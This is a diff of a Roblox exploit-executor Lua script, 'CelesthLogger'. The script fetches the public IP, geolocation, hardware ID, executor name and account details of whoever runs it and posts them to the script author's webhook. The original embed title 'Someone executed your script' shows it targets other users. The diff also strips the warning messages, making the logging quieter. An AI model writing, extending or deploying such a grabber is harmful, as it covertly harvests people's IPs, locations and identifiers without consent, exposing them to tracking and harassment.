@@ -1,4 +1,3 @@
--- CelesthLogger.lua
 local Celesth = {}
 Celesth.__index = Celesth
 
@@ -18,7 +17,7 @@ local Country = LocalizationService.RobloxLocaleId
 local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 local JoinLine = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
--- Config flags (editable via _G)
+-- Config flags (_G)
 _G.IpLog = _G.IpLog ~= false
 _G.GeoLog = _G.GeoLog ~= false
 _G.HwidLog = _G.HwidLog ~= false
@@ -28,23 +27,24 @@ _G.PingEveryone = _G.PingEveryone or false
 _G.IgnoreLoggedCheck = _G.IgnoreLoggedCheck or false
 _G.IgnoreCooldown = _G.IgnoreCooldown or false
 _G.WebhookCooldown = tonumber(_G.WebhookCooldown) or 60
-_G.EmbedTitle = _G.EmbedTitle or "Someone executed your script"
+_G.EmbedTitle = _G.EmbedTitle or "Script Executed"
 _G.EmbedMessage = _G.EmbedMessage or ""
 _G.EmbedColor = tonumber(_G.EmbedColor) or 16766720
 _G.EmbedThumbnail = _G.EmbedThumbnail or ("https://www.roblox.com/headshot-thumbnail/image?userId="..UserId.."&width=150&height=150&format=png")
 
+-- Constants
 local AVATAR_URL = ""
-local FOOTER_TEXT = "Celes's Wh• korieuko"
+local FOOTER_TEXT = "Celesth Logger • korieuko"
 local LOG_PATH = "stellarium/logged.txt"
 
+-- G_
 _G_ = rawget(getgenv(), "G_") or {}; getgenv().G_ = _G_
 
+-- Info functions
 local function GetIP()
     if not _G.IpLog then return "Disabled" end
     if not G_.ip then
-        local ok, res = pcall(function()
-            return game:HttpGet("https://v4.ident.me/")
-        end)
+        local ok, res = pcall(function() return game:HttpGet("https://v4.ident.me/") end)
         G_.ip = ok and res or "Unavailable"
     end
     return G_.ip
@@ -53,9 +53,7 @@ end
 local function GetGeo()
     if not _G.GeoLog then return {message = "Disabled"} end
     if not G_.geo then
-        local ok, res = pcall(function()
-            return game:HttpGet("http://ip-api.com/json")
-        end)
+        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json") end)
         G_.geo = ok and HttpService:JSONDecode(res) or { message = "Unavailable" }
     end
     return G_.geo
@@ -67,13 +65,16 @@ end
 
 local function GetExecutor()
     if not _G.ExecutorLog then return "Disabled" end
-    return identifyexecutor and identifyexecutor() or "Unknown"
+    return (identifyexecutor and identifyexecutor()) or "Unknown"
 end
 
 function Celesth:BuildEmbed()
     local ip, geo, hwid, exec = GetIP(), GetGeo(), GetHWID(), GetExecutor()
 
     local desc = table.concat({
+        "**Profile Link:** [View Profile](https://www.roblox.com/users/" .. UserId .. ")",
+        "**Game Link:** [View Game](https://www.roblox.com/games/" .. game.PlaceId .. ")",
+        "",
         "Username:\n" .. Username,
         "DisplayName:\n" .. DisplayName,
         "UserId:\n" .. tostring(UserId),
@@ -116,17 +117,11 @@ function Celesth:Log(webhookUrl)
 
     if not _G.IgnoreCooldown and G_.LastSent then
         local delta = tick() - G_.LastSent
-        if delta < _G.WebhookCooldown then
-            warn("[CelesthLogger] Cooldown skipped (" .. math.floor(delta) .. "s < " .. _G.WebhookCooldown .. "s)")
-            return
-        end
+        if delta < _G.WebhookCooldown then return end
     end
 
     if not _G.IgnoreLoggedCheck and isfile and readfile then
-        if isfile(LOG_PATH) and readfile(LOG_PATH):lower():find("true") then
-            warn("[CelesthLogger] Already logged—skipping webhook.")
-            return
-        end
+        if isfile(LOG_PATH) and readfile(LOG_PATH):lower():find("true") then return end
     end
 
     local req = http_request or request
